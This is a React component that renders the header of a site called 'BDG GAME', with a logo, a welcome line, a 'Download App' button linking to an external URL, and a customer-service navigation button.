import DownloadForOfflineIcon from '@mui/icons-material/DownloadForOffline';
import HeadsetMicIcon from '@mui/icons-material/HeadsetMic';
import { useState } from 'react';
import { Navigate } from 'react-router-dom';
export const HeaderHome = () => {
    const [redirectToHome, setRedirectToHome] = useState(false);
    const handleCareService=()=>{ setRedirectToHome(true) }
    if (redirectToHome) {
        return <Navigate to="/AppLoginRegisterPage/CustomerService" />;
    }
    const handleDownload=()=>{
        window.location.href = "https://ghsj.cawjyuo.icu/uwssz";
    }
    return (
        <>
            <div className="home-header">
                <div className='left-header'>
                    <div className='heading'><img alt="pic Not found" src='https://ossimg.bdgadminbdg.com/IndiaBDG/other/h5setting_202401100608011fs2.png' /><div></div></div>
                    <div className="header-flag-section">
                        <img alt="logo" src="https://media.istockphoto.com/id/880562092/vector/great-britain-united-kingdom-flag.jpg?s=612x612&w=0&k=20&c=z6Qg_O-2pIcreAK3Fb8X003h2HRIFiRWNT8cg7hDfFo=" />
                        <h5>Welcome to BDG GAME</h5>
                    </div>
                </div>
                <div className='right-header'>
                    <button type="submit" onClick={handleDownload}>  <DownloadForOfflineIcon style={{fontSize:30}} /> <div className='download-btn'><h5>Download</h5> <h5>App</h5></div> </button>
                    <button type="submit" onClick={handleCareService}><HeadsetMicIcon style={{fontSize:30}}/> <div className='download-btn'><h5>Customer</h5> <h5>Service</h5></div></button>
                </div>
            </div>
        </>
    );
}